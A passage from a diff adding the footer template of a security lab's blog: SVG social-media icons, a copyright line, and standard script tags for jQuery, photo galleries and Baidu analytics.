39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
